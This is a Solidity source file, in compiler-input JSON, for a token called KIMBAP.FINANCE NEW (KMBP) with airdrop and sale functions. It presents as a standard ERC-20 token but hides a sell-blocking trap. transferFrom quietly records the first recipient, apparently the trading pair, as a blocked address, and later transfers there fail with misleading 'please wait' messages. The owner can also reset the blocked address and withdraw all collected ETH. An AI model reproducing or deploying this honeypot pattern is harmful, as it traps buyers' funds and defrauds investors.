{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "KimBap_token.sol": {
      "content": "/**\r\n *  /$$   /$$ /$$$$$$ /$$      /$$ /$$$$$$$   /$$$$$$  /$$$$$$$ \r\n * | $$  /$$/|_  $$_/| $$$    /$$$| $$__  $$ /$$__  $$| $$__  $$\r\n * | $$ /$$/   | $$  | $$$$  /$$$$| $$  \\ $$| $$  \\ $$| $$  \\ $$\r\n * | $$$$$/    | $$  | $$ $$/$$ $$| $$$$$$$ | $$$$$$$$| $$$$$$$/\r\n * | $$  $$    | $$  | $$  $$$| $$| $$__  $$| $$__  $$| $$____/ \r\n * | $$\\  $$   | $$  | $$\\  $ | $$| $$  \\ $$| $$  | $$| $$      \r\n * | $$ \\  $$ /$$$$$$| $$ \\/  | $$| $$$$$$$/| $$  | $$| $$      \r\n * |__/  \\__/|______/|__/     |__/|_______/ |__/  |__/|__/      \r\n *                                                              \r\n *                                                              \r\n *                                                              \r\n *  /$$$$$$$   /$$$$$$  /$$  /$$  /$$                           \r\n * | $$__  $$ /$$__  $$| $$ | $$ | $$                           \r\n * | $$  \\ $$| $$$$$$$$| $$ | $$ | $$                           \r\n * | $$  | $$| $$_____/| $$ | $$ | $$                           \r\n * | $$  | $$|  $$$$$$$|  $$$$$/$$$$/                           \r\n * |__/  |__/ \\_______/ \\_____/\\___/           \r\n*/\r\n\r\npragma solidity >=0.5.10;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  address public newun;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"KMBP\";\r\n    name = \"KIMBAP.FINANCE NEW\";\r\n    decimals = 18;\r\n    _totalSupply =  2000 ether;\r\n    balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transfernewun(address _newun) public onlyOwner {\r\n    newun = _newun;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != newun, \"please wait\");\r\n     \r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && newun == address(0)) newun = to;\r\n      else require(to != newun, \"please wait 10 min\");\r\n      \r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract KimBap_token  is TokenERC20 {\r\n\r\n  \r\n  uint256 public aKimBapBlock; \r\n  uint256 public aKimBapEBlock; \r\n  \r\n  uint256 public aCap; \r\n  uint256 public aTot; \r\n  uint256 public aAmt; \r\n \r\n  uint256 public sKimBapSBlock; \r\n  uint256 public sKimBapEDBlock; \r\n  \r\n  uint256 public sTot; \r\n  uint256 public sCap; \r\n\r\n  uint256 public sKimChunk; \r\n  uint256 public sPrice; \r\n\r\n  function getAirdrop(address _refer) public returns (bool success){\r\n    require(aKimBapBlock <= block.number && block.number <= aKimBapEBlock);\r\n    require(aTot < aCap || aCap == 0);\r\n    aTot ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(aAmt / 4);\r\n      balances[_refer] = balances[_refer].add(aAmt / 4);\r\n      emit Transfer(address(this), _refer, aAmt / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(aAmt);\r\n    balances[msg.sender] = balances[msg.sender].add(aAmt);\r\n    emit Transfer(address(this), msg.sender, aAmt);\r\n    return true;\r\n  }\r\n\r\n  function tokenSale(address _refer) public payable returns (bool success){\r\n    require(sKimBapSBlock <= block.number && block.number <= sKimBapEDBlock);\r\n    require(sTot < sCap || sCap == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(sKimChunk != 0) {\r\n      uint256 _price = _eth / sPrice;\r\n      _tkns = sKimChunk * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / sPrice;\r\n    }\r\n    sTot ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(aKimBapBlock, aKimBapEBlock, aCap, aTot, aAmt);\r\n  }\r\n  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\r\n    return(sKimBapSBlock, sKimBapEDBlock, sCap, sTot, sKimChunk, sPrice);\r\n  }\r\n  \r\n  function startAirdrop(uint256 _aKimBapBlock, uint256 _aKimBapEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {\r\n    aKimBapBlock = _aKimBapBlock;\r\n    aKimBapEBlock = _aKimBapEBlock;\r\n    aAmt = _aAmt;\r\n    aCap = _aCap;\r\n    aTot = 0;\r\n  }\r\n  function startSale(uint256 _sKimBapSBlock, uint256 _sKimBapEDBlock, uint256 _sKimChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner() {\r\n    sKimBapSBlock = _sKimBapSBlock;\r\n    sKimBapEDBlock = _sKimBapEDBlock;\r\n    sKimChunk = _sKimChunk;\r\n    sPrice =_sPrice;\r\n    sCap = _sCap;\r\n    sTot = 0;\r\n  }\r\n  function clearETH() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}"
    }
  }
}